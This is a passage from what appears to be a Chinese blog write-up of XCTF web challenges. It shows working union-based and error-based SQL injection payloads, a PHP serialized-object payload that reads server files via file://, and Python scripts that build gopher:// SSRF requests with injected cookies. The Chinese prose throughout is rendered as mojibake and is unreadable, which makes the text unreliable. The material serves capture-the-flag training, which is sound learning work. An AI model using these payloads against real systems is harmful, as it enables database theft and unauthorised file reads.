</span></span><span class="line"><span class="cl">        <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$output</span> <span class="o">=</span> <span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$httpCode</span> <span class="o">=</span> <span class="nx">curl_getinfo</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLINFO_HTTP_CODE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$httpCode</span> <span class="o">==</span> <span class="mi">404</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="mi">404</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nx">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$output</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈáåÊúâcurl_execÂáΩÊï∞ÊâÄÊúâÂ≠òÂú®SSRFÊºèÊ¥û</p>
<p>ÂàõÂª∫‰∏Ä‰∏™Áî®Êà∑</p>
<p>Êúâno‰Ωú‰∏∫ÂèÇÊï∞ÔºåÂ∞ùËØï‰∏Ä‰∏ã‰º™ÂçèËÆÆËØªÂèñflag.phpÔºåÂõûÊòæÊòØsqlÊï∞ÊçÆÂ∫ìÁöÑÊä•Èîô</p>
<p>ËØ¥ÊòénoÂèÇÊï∞ÂèØ‰ª•sqlÊ≥®ÂÖ•</p>
<p>Ê≤°ÊúâÈó≠Âêà</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?no=1 and 1=1 order by 4#
</span></span><span class="line"><span class="cl">?no=-1 union select 1,2,3,4#
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôËæπÂõûÊòæno hackÔºåËÇØÂÆöËøáÊª§‰∫Ü‰ªÄ‰πà</p>
<p>ÂÖàÊ£ÄÊµãÁ©∫Ê†º</p>
<p>Áî®/**/ËøáÊª§</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?no=-1/**/union/**/select/**/1,2,3,4#
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250120113238376.png"
	width="1815"
	height="622"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250120113238376_hu2937317610874725887.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250120113238376_hu4694771682945304854.png 1024w"
	loading="lazy"
	
		alt="image-20250120113238376"
	
	
		class="gallery-image" 
		data-flex-grow="291"
		data-flex-basis="700px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Âõ†‰∏∫ÊòØÁ¨¨‰∫å‰∏™‰ΩçÁΩÆÂõûÊòæ
</span></span><span class="line"><span class="cl">?no=-1/**/union/**/select/**/1,group_concat(schema_name),3,4/**/from information_schema.schemata--+
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250120113540215.png"
	width="1680"
	height="672"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250120113540215_hu5805633468513703291.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250120113540215_hu14522959530345294471.png 1024w"
	loading="lazy"
	
		alt="image-20250120113540215"
	
	
		class="gallery-image" 
		data-flex-grow="250"
		data-flex-basis="600px"
	
></p>
<p>Êü•Áúãfakebook</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?no=-1/**/union/**/select 1,group_concat(table_name),3,4/**/from/**/information_schema.tables/**/where/**/table_schema=database()--+//ÊàñËÄÖÊòØtable_schemaa=&#39;fakebook&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Âá∫Áé∞users</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?no=-1/**/union/**/select/**/1,group_concat(column_name),3,4/**/from/**/information_schema.columns/**/where/**/table_name=&#39;users&#39;--+
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250120114354216.png"
	width="1753"
	height="691"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250120114354216_hu15075233471750827866.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250120114354216_hu15698735692786285370.png 1024w"
	loading="lazy"
	
		alt="image-20250120114354216"
	
	
		class="gallery-image" 
		data-flex-grow="253"
		data-flex-basis="608px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ÁàÜÁ†¥Â≠óÊÆµÊàëËá™Â∑±ÊûÑÈÄ†ÁöÑ‰∏çË°åÔºåÊü•ÁúãÂà´‰∫∫ÁöÑ
</span></span><span class="line"><span class="cl">?no=-1 union/**/select/**/1,group_concat(no,&#39;~&#39;,username,&#39;~&#39;,passwd,&#39;~&#39;,data),3,4/**/from/**/fakebook.users
</span></span><span class="line"><span class="cl">?no=2 union/**/select 1,group_concat(data),3,4 from users#
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250120115640081.png"
	width="1911"
	height="726"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250120115640081_hu18335053679319860540.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250120115640081_hu14364030519208119123.png 1024w"
	loading="lazy"
	
		alt="image-20250120115640081"
	
	
		class="gallery-image" 
		data-flex-grow="263"
		data-flex-basis="631px"
	
></p>
<p>Âá∫Êù•‰∏Ä‰∏≤Â∫èÂàóÂåñÁöÑÂ≠óÁ¨¶‰∏≤ÔºåÊ†πÊçÆÂè≥ËæπÊèêÁ§∫Êü•Áúã/var/www/html/view.php</p>
<p>Êé•‰∏ãÊù•Â∞±ÊòØÊûÑÈÄ†Â∫èÂàóÂåñÂØπË±°Êù•ËÆøÈóÆ/var/www/html/view.php,ÊµèËßàÂô®Áõ¥Êé•ËÆøÈóÆËÇØÂÆöÊ≤°‰∏úË•øÔºåÁî®file://‰º™ÂçèËÆÆËØªÂèñÊñá‰ª∂</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">UserInfo</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">   <span class="k">public</span> <span class="nv">$name</span><span class="o">=</span><span class="s2">&#34;1&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">   <span class="k">public</span> <span class="nv">$age</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">   <span class="k">public</span> <span class="nv">$blog</span><span class="o">=</span><span class="s2">&#34;file:///var/www/html/view.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">UserInfo</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">O</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="s2">&#34;UserInfo&#34;</span><span class="p">:</span><span class="mi">3</span><span class="p">:{</span><span class="n">s</span><span class="p">:</span><span class="mi">4</span><span class="p">:</span><span class="s2">&#34;name&#34;</span><span class="p">;</span><span class="n">s</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="s2">&#34;1&#34;</span><span class="p">;</span><span class="n">s</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span><span class="s2">&#34;age&#34;</span><span class="p">;</span><span class="n">i</span><span class="p">:</span><span class="mi">0</span><span class="p">;</span><span class="n">s</span><span class="p">:</span><span class="mi">4</span><span class="p">:</span><span class="s2">&#34;blog&#34;</span><span class="p">;</span><span class="n">s</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="s2">&#34;file:///var/www/html/view.php&#34;</span><span class="p">;}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ê†πÊçÆ‰πãÂâçÁöÑÊ≥®ÂÖ•ÂèØÁü•ÔºåÊúâÂõûÊòæÁöÑÊòØÁ¨¨‰∫å‰ΩçÔºå‰πüÂ∞±ÊòØ<code>username</code>Â≠óÊÆµÔºå<code>data</code>ÂØπÂ∫îÂ∫îËØ•Â∞±ÊòØÁ¨¨Âõõ‰∏™Â≠óÊÆµ‰∏∫ÔºåÂ∞ÜÂèçÂ∫èÂàóÂåñÂ≠óÁ¨¶‰∏≤Â∞ùËØï‰ª•Ê≥®ÂÖ•ÁöÑÊñπÂºèÂÜôÂÖ•</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">?</span><span class="n">no</span><span class="o">=-</span><span class="mi">1</span> <span class="n">union</span><span class="o">/**/</span><span class="n">select</span><span class="o">/**/</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="s1">&#39;O:8:&#34;UserInfo&#34;:3:{s:4:&#34;name&#34;;s:1:&#34;1&#34;;s:3:&#34;age&#34;;i:0;s:4:&#34;blog&#34;;s:29:&#34;file:///var/www/html/flag.php&#34;;}&#39;</span>
</span></span><span class="line"><span class="cl"><span class="err">Ê≥®ÊÑèÂ∫èÂàóÂåñÂ≠óÁ¨¶‰∏≤Ë¶ÅÂä†</span><span class="s1">&#39;&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>‰º†ÂÖ•ÂêéÊü•ÁúãÊ∫êÁ†ÅÔºåÊúÄ‰∏ãÈù¢Â∞±ÊòØÊàë‰ª¨ÂÜôÂÖ•ÁöÑblogÈìæÊé•Â∞±ÊòØflagÁöÑÈìæÊé•</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250120121046849.png"
	width="1790"
	height="211"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250120121046849_hu35661371846742026.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250120121046849_hu9541665223747479854.png 1024w"
	loading="lazy"
	
		alt="image-20250120121046849"
	
	
		class="gallery-image" 
		data-flex-grow="848"
		data-flex-basis="2036px"
	
></p>
<h2 id="very_easy_sql">very_easy_sql
</h2><p>ÂàöÂºÄÂßãÁöÑÁΩëÈ°µÊÄé‰πàÈÉΩÊ≥®ÂÖ•‰∏çËøõÂéª</p>
<p>Êü•ÁúãÊ∫êÁ†ÅÂèëÁé∞use.php</p>
<p>Ë¶ÅÊ±ÇËæìÂÖ•url</p>
<p>ÁúãÂà∞curlÔºåÊúâÁÇπÂÉèSSRFÊºèÊ¥ûÔºåÂà©Áî®ssrfÂèØ‰ª•Áî®gopherÂçèËÆÆ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib.parse</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">host</span> <span class="o">=</span> <span class="s2">&#34;127.0.0.1:80&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">content</span> <span class="o">=</span> <span class="s2">&#34;uname=admin&amp;passwd=admin&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">content_length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">test</span> <span class="o">=</span>\
</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;POST /index.php HTTP/1.1
</span></span></span><span class="line"><span class="cl"><span class="s2">Host: </span><span class="si">{}</span><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">User-Agent: curl/7.43.0
</span></span></span><span class="line"><span class="cl"><span class="s2">Accept: */*
</span></span></span><span class="line"><span class="cl"><span class="s2">Content-Type: application/x-www-form-urlencoded
</span></span></span><span class="line"><span class="cl"><span class="s2">Content-Length: </span><span class="si">{}</span><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2"></span><span class="si">{}</span><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">content_length</span><span class="p">,</span><span class="n">content</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">tmp</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">test</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">new</span> <span class="o">=</span> <span class="n">tmp</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;%0A&#34;</span><span class="p">,</span><span class="s2">&#34;%0D%0A&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">new</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;gopher://&#34;</span><span class="o">+</span><span class="n">host</span><span class="o">+</span><span class="s2">&#34;/_&#34;</span><span class="o">+</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250120165819759.png"
	width="1496"
	height="734"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250120165819759_hu10525937081612585875.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250120165819759_hu9395480923389652572.png 1024w"
	loading="lazy"
	
		alt="image-20250120165819759"
	
	
		class="gallery-image" 
		data-flex-grow="203"
		data-flex-basis="489px"
	
></p>
<p>setcookieÈÇ£ÈáåÊòØadminÁöÑbase64ÁºñÁ†ÅÔºåÊé®ÊµãÈÇ£ÈáåÊòØÊ≥®ÂÖ•ÁÇπ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ÂÖàÊµãËØïÈó≠Âêà
</span></span><span class="line"><span class="cl">admin&#39; #
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib.parse</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">host</span> <span class="o">=</span> <span class="s2">&#34;127.0.0.1:80&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">cookie</span><span class="o">=</span><span class="s2">&#34;this_is_your_cookie=YWRtaW4nICM=&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">test</span> <span class="o">=</span>\
</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;GET /index.php HTTP/1.1
</span></span></span><span class="line"><span class="cl"><span class="s2">Host: </span><span class="si">{}</span><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">Connection: close
</span></span></span><span class="line"><span class="cl"><span class="s2">Content-Type: application/x-www-form-urlencoded
</span></span></span><span class="line"><span class="cl"><span class="s2">Cookie:</span><span class="si">{}</span><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">cookie</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">tmp</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">test</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="n">new</span> <span class="o">=</span> <span class="n">tmp</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;%0A&#34;</span><span class="p">,</span><span class="s2">&#34;%0D%0A&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">new</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;gopher://&#34;</span><span class="o">+</span><span class="n">host</span><span class="o">+</span><span class="s2">&#34;/_&#34;</span><span class="o">+</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250120170344018.png"
	width="1498"
	height="740"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250120170344018_hu7262542278779887458.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250120170344018_hu16128043016853478251.png 1024w"
	loading="lazy"
	
		alt="image-20250120170344018"
	
	
		class="gallery-image" 
		data-flex-grow="202"
		data-flex-basis="485px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ÊµãËØïÂà´ÁöÑÈó≠ÂêàÊñπÂºè
</span></span><span class="line"><span class="cl">ËôΩÁÑ∂&#34;‰πüÊ≤°ÂõûÊòæ‰ΩÜÊòØËØïÂõæÊé•ÁùÄÁî®&#34;Êä•ÈîôÊ≥®ÂÖ•‰πüÊ≤°ÂõûÊòæÔºåÊç¢Êàê&#39;)Â∞±ÂõûÊòæ‰∫Ü
</span></span><span class="line"><span class="cl">ÁàÜÁ†¥Êï∞ÊçÆÂ∫ìÂêç
</span></span><span class="line"><span class="cl">admin&#39;) and extractvalue(1,concat(0x7e,database(),0x7e))#
</span></span><span class="line"><span class="cl">ËøôËæπÁî®--+Ê≥®Èáä‰∏çË°å
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250120171606488.png"
	width="1508"
	height="779"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250120171606488_hu5088072464863389225.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250120171606488_hu16471695108733486579.png 1024w"
	loading="lazy"
	
		alt="image-20250120171606488"
	
	
		class="gallery-image" 
		data-flex-grow="193"
		data-flex-basis="464px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">‰∏∫‰∫ÜÊñπ‰æøËøòÊòØÊîπËÑöÊú¨</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib.parse</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl"><span class="n">host</span> <span class="o">=</span> <span class="s2">&#34;127.0.0.1:80&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;admin&#39;) and extractvalue(1,concat(0x7e,database(),0x7e))#&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">base64_payload</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)),</span> <span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">cookie</span><span class="o">=</span><span class="s2">&#34;this_is_your_cookie=&#34;</span><span class="o">+</span><span class="n">base64_payload</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">test</span> <span class="o">=</span>\
</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;GET /index.php HTTP/1.1
</span></span></span><span class="line"><span class="cl"><span class="s2">Host: </span><span class="si">{}</span><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">Connection: close
</span></span></span><span class="line"><span class="cl"><span class="s2">Content-Type: application/x-www-form-urlencoded
</span></span></span><span class="line"><span class="cl"><span class="s2">Cookie:</span><span class="si">{}</span><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">cookie</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">tmp</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">test</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">new</span> <span class="o">=</span> <span class="n">tmp</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;%0A&#34;</span><span class="p">,</span><span class="s2">&#34;%0D%0A&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">new</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;gopher://&#34;</span><span class="o">+</span><span class="n">host</span><span class="o">+</span><span class="s2">&#34;/_&#34;</span><span class="o">+</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ÁàÜÁ†¥Ë°®Âêç
</span></span><span class="line"><span class="cl">admin&#39;) or extractvalue(1,concat(0x7e,(select group_concat(table_name)from
</span></span><span class="line"><span class="cl">information_schema.tables where table_schema=database()),0x7e))#
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250120172009927.png"
	width="1475"
	height="781"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250120172009927_hu10609609471865802438.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250120172009927_hu3473464351993340138.png 1024w"
	loading="lazy"
	
		alt="image-20250120172009927"
	
	
		class="gallery-image" 
		data-flex-grow="188"
		data-flex-basis="453px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ÁàÜÁ†¥Â≠óÊÆµÂêç
</span></span><span class="line"><span class="cl">admin&#39;) or extractvalue(1,concat(0x7e,(select group_concat(column_name)from
</span></span><span class="line"><span class="cl">information_schema.columns where table_name=&#39;flag&#39;),0x7e))#
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250120172141977.png"
	width="1503"
	height="805"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250120172141977_hu11722049674916012827.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250120172141977_hu9903657710243563652.png 1024w"
	loading="lazy"
	
		alt="image-20250120172141977"
	
	
		class="gallery-image" 
		data-flex-grow="186"
		data-flex-basis="448px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ÁàÜÁ†¥Â≠óÊÆµ
</span></span><span class="line"><span class="cl">admin&#39;) or extractvalue(1,concat(0x7e,(select flag from flag limit
</span></span><span class="line"><span class="cl">0,1),0x7e))#
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250120172451809.png"
	width="1467"
	height="767"
